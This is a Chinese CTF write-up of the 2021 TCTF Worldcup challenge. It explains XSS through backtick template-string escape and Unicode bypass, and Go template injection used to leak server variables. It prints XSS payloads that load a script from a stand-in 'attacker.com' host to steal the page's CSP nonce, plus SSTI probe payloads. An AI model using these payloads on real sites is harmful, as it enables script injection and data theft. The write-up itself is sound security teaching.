---
title: 2021 TCTF Worldcup 三关挑战复现：XSS 与 Go SSTI
description: 复现 2021 TCTF worldcup 三关挑战：Level 1/2 利用反引号逃逸与 Unicode 编码绕过实现 XSS 窃取 Nonce，Level
  3 结合 Go 模板注入（SSTI）泄露服务端变量从而精准押注拿 Flag
category: ai-security
tags:
- TCTF
- XSS
- SSTI
- Go
- 模板注入
- 2021
date: 2021-04-15
updated: '2026-11-12'
---

## 概述

本页面记录 2021 TCTF Worldcup 题目的完整复现过程。该题分为三关：
- **Level 1/2**：前端 JavaScript 解析逻辑缺陷，利用反引号（`）逃逸模板字符串，配合 Unicode 编码绕过转义，实现 XSS 窃取 CSP Nonce。
- **Level 3**：后端 Go `text/template` 模板注入（SSTI），泄露服务端对比用的两个随机变量，据此精准押注连胜 20 次获取 Flag。

同期另一道 TCTF 题目 `1linephp` 的利用链（ZIP 协议包含临时文件/Session 文件）详见 [[tctf-2021-1linephp-zip-include]]。

## Level 1：反引号逃逸与 Unicode 编码绕过 XSS

### 核心逻辑

前端定义 `ParseMSG` 函数，将用户可控的 `nickname` 与 `msg` 拼入模板字符串：

```js
const ParseMSG = (d) => {
  if (d['name'] != "'`")
    return `${d['name']}(quota ${d['quota'] != -1 ? d['used'] + "/" + d['quota'] : 'unlimited'}): ${d['msg']}`;
  else
    return `Your quota: 1, Nickname: '``}`;
};
for (let i = 0; i < 5; ++i)
  $("#msg").append('<div class="form-group row"><p>' + ParseMSG(msg[i]) + '</p></div>');
$("#newmsg").text('(quota 1/1): "'`;};alert();//"');
```

### 利用思路

1. **反引号逃逸**  
   在 `nickname` 中提交 `` '` ``（单引号 + 反引号），使得 `d['name'] != "'\`"` 判断为 `true`，进入第一个分支。同时反引号闭合了模板字符串，后续 `msg` 可注入任意 JS 代码。

2. **Unicode 编码绕过转义**  
   前端对 `msg` 做了简单转义（将 `'` 编码为 `\u0027`）。但在反引号模板字符串中，`\u0027` 仍会被解析为单引号，因此可直接在 `msg` 中使用 `\u0027` 闭合字符串。

3. **窃取 CSP Nonce**  
   页面脚本带有 `nonce`，需动态获取。Payload 示例：

   ```text
   nickname: '`
   msg: `);};document.write(\`<script src='//attacker.com/steal?nonce='+\`+$('script')[0].nonce+\`'></script>\`)//
   ```

   拼接后生成的 JS 会执行 `document.write` 引入外部脚本，并携带当前页面的 `nonce` 值。

### 关键 Cookie

```
User-Agent: set cookie: level1 NoQWeCy70QekDB5b
```

## Level 2：简化上下文的 XSS 利用

### 核心逻辑

Level 2 移除了 `if` 判断，直接拼接：

```js
const ParseMSG = (d) => {
  return `${d['name']}(quota ${d['quota'] != -1 ? d['used'] + "/" + d['quota'] : 'unlimited'}): ${d['msg']}`;
};
for (let i = 0; i < 4; ++i)
  $("#msg").append('<div class="form-group row"><p>' + ParseMSG(msg[i]) + '</p></div>');
$("#newmsg").text(`"`);alert();//"`);
```

### 利用方式

直接在 `nickname` 闭合模板字符串，`msg` 注入代码：

```text
nickname: `);alert()//
msg: `);document.write(\`<script src='//attacker.com/steal?nonce='+\`+$('script')[0].nonce+\`'></script>\`)//
```

### 关键 Cookie

```
User-Agent: set cookie: level2 Autx5F53FmmSFayM
```

## Level 3：Go 模板注入（SSTI）泄露变量并精准押注

### 业务逻辑

后端生成两个随机数 `a`、`b`，前端 JS 对比大小决定押注队伍（Three Body / Singer），连胜 20 次可兑换 Flag。一次失误即清空金币。

前端判胜代码：

```js
const res = ((a, b) => {
  if (parseInt(a) >= parseInt(b)) {
    if ("1".substring(0, 1) == "1")
      return 'You bet Three Body and win!'
  } else {
    if ("1".substring(0, 1) == "0")
      return 'You bet Singer and win!'
  }
  return 'You choose the wrong team...'
})("96", "15")
$("#res").text(res);
```

### SSTI 利用

Go `text/template` 渲染页面时存在模板注入，可执行表达式输出服务端变量。

常用探测 Payload：

```text
{{7*7}}           // 输出 49 确认 SSTI
{{.money|print}}  // 输出当前金币
{{$}}             // 输出根上下文所有变量
```

通过 `{{$}}` 可看到完整结构，定位到对比用的两个变量（如 `o0ps_u_Do1nt_no_t1` 与 `90`）。

### 实战步骤

1. 注入 `{{$}}` 获取变量列表，找到两个用于比较的字段（示例中为 `o0ps_u_Do1nt_no_t1: 90`）。
2. 根据大小关系决定押注：
   - 若第一个变量 ≥ 第二个 → 押注 **Three Body**
   - 否则 → 押注 **Singer**
3. 编写脚本自动化押注 20 次，即可获得 Flag。

### 参考资源

- Go 模板语法速查：<https://colobu.com/2019/11/05/Golang-Templates-Cheatsheet/>
- SSTI 利用技巧：<https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html>

## 参考 WP

- W&M 战队详细复现：<https://mp.weixin.qq.com/s/K-sEJMhGYjn2aee5hurOww>

## 来源

- [0th3rs安全团队-201911-202204_003](../sources/0th3rs安全团队-201911-202204_003.md)
